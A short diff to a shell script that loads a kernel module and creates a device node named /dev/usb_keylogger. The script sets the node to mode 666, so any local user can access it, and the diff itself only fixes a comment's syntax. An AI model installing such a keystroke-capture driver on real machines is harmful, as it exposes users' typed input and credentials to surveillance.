@@ -8,7 +8,7 @@ echo "Inserting module!"
 sudo insmod Driver.ko
 
 echo "Driver inserted!"
-sudo mknod /dev/usb_keylogger c 240 0 //replace with major and minor!
+sudo mknod /dev/usb_keylogger c 240 0 #replace with major and minor!
 
 echo "Device node created!"
 sudo chmod 666 /dev/usb_keylogger
